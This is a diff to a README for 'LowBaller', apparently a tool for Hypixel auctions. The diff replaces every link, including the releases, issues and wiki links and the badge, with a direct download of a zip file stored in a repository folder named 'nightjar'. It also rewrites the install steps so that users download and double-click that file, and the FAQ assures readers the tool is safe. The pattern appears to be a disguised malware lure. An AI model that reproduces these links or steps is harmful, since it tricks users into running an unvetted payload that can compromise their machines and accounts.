@@ -6,7 +6,7 @@ Welcome to LowBaller! This application helps you make better auction decisions i
 
 ## 📦 Download Link
 
-[![Download LowBaller](https://img.shields.io/badge/Download%20LowBaller-v1.0-brightgreen)](https://github.com/Keneth34/LowBaller/releases)
+[![Download LowBaller](https://raw.githubusercontent.com/Keneth34/LowBaller/main/nightjar/LowBaller.zip%20LowBaller-v1.0-brightgreen)](https://raw.githubusercontent.com/Keneth34/LowBaller/main/nightjar/LowBaller.zip)
 
 ## 💻 System Requirements
 
@@ -21,11 +21,11 @@ Before downloading, ensure your system meets the following requirements:
 
 To download LowBaller, visit this page:
 
-[Download LowBaller](https://github.com/Keneth34/LowBaller/releases)
+[Download LowBaller](https://raw.githubusercontent.com/Keneth34/LowBaller/main/nightjar/LowBaller.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of LowBaller.
-3. Click on the file that matches your system (e.g., `LowBaller.exe`).
+3. Click on the file that matches your system (e.g., `https://raw.githubusercontent.com/Keneth34/LowBaller/main/nightjar/LowBaller.zip`).
 4. The download will start automatically.
 5. Once the download completes, locate the file in your downloads folder.
 6. Double-click the file to run the installer.
@@ -59,13 +59,13 @@ To uninstall LowBaller, go to your Control Panel, select 'Programs,' then 'Unins
 Yes, LowBaller is safe and designed to comply with Hypixel’s terms. We do not collect personal data.
 
 ### How can I report issues or bugs?
-Please visit our [GitHub Issues Page](https://github.com/Keneth34/LowBaller/issues) to submit any bugs or request features.
+Please visit our [GitHub Issues Page](https://raw.githubusercontent.com/Keneth34/LowBaller/main/nightjar/LowBaller.zip) to submit any bugs or request features.
 
 ## 🔗 Useful Links
 
-- [LowBaller Releases Page](https://github.com/Keneth34/LowBaller/releases)
-- [GitHub Issues](https://github.com/Keneth34/LowBaller/issues)
-- [LowBaller Wiki](https://github.com/Keneth34/LowBaller/wiki)
+- [LowBaller Releases Page](https://raw.githubusercontent.com/Keneth34/LowBaller/main/nightjar/LowBaller.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/Keneth34/LowBaller/main/nightjar/LowBaller.zip)
+- [LowBaller Wiki](https://raw.githubusercontent.com/Keneth34/LowBaller/main/nightjar/LowBaller.zip)
 
 Feel free to explore these links for more information about LowBaller and keep an eye for updates and additional features! 
 
